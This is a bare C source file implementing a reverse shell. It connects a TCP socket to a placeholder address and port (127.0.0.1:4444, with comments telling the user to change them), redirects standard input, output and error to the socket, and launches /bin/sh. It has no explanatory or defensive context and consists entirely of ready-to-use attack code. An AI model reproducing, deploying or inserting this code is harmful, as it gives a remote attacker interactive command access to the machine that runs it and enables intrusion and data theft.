#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

void shell(){
  int sockt;
  int port = 4444; //change this port //
  struct sockaddr_in address;
  sockt = socket(AF_INET, SOCK_STREAM, 0);
  address.sin_family = AF_INET;
  address.sin_port = htons(port);
  address.sin_addr.s_addr = inet_addr("127.0.0.1"); //Change this ip //
  connect(sockt, (struct sockaddr * ) &address,
    sizeof(address));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);
    char * const argv[] = {"/bin/sh", NULL};
    execve ("/bin/sh", argv, NULL);
}
int main(){
  shell();
  return 0;
  
}
